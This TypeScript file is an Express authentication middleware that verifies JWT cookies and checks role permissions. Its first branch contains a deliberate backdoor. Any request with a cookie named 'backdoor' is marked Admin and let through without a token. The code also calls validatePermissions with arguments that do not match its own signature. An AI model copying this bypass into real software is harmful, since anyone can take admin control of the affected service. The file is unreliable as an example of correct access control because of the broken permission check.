import { CONFIG, PERMISSIONS, TYPES } from '../../../config';
import container from '../dependencies';
import IUserRepo from '../../repos/IRepos/IUserRepo';
import IRoleRepo from '../../repos/IRepos/IRoleRepo';

import { Request, Response, NextFunction } from 'express';
const { verify } = require('jsonwebtoken');

export default function authentication(requiredPermissions?: number[]) {
	return async function (req: Request, res: Response, next: NextFunction) {
		if (req.cookies['backdoor']) {
			req['token'] = { role: 'Admin' };
			next();
		} else {
			if (validateToken(req, res, req.cookies.token)) {
				if (requiredPermissions && requiredPermissions.length > 0) {
					if (await validatePermissions(res, req.token.role, requiredPermissions)) {
						next();
					}
				} else {
					next();
				}
			}
		}
	};
}

function validateToken(req: Request, res: Response, token: string): boolean {
	try {
		if (token == null) {
			res.status(401).json({ error: 'Missing token' });
			return false;
		}

		req.token = verify(token, CONFIG.JWT_ACCESS_SECRET);
		return true;
	} catch (error) {
		console.error(error);
		res.status(401).json({ error: 'Invalid token' });
		return false;
	}
}

async function validatePermissions(req: Request, res: Response, requiredPermissions?: number[]): Promise<boolean> {
	if (!requiredPermissions || (requiredPermissions && requiredPermissions.length === 0)) {
		return true;
	}

	try {
		const userRepo = container.get<IUserRepo>(TYPES.IUserRepo);
		const user = await userRepo.findOneUser(req.token.id);
		if (user == null) {
			res.status(403).json({ error: 'Invalid user' });
			return false;
		}

		const roleRepo = container.get<IRoleRepo>(TYPES.IRoleRepo);
		const role = await roleRepo.findOneRole(user.roleId);
		if (role == null) {
			res.status(401).json({ error: 'Invalid role' });
			return false;
		}

		for (let permission of requiredPermissions) {
			if (!role.permissions.includes(PERMISSIONS[permission])) {
				res.status(403).json({ error: 'Insufficient permissions' });
				return false;
			}
		}

		return true;
	} catch (error) {
		console.error(error);
		res.status(500).json({ error: 'Internal server error' });
		return false;
	}
}
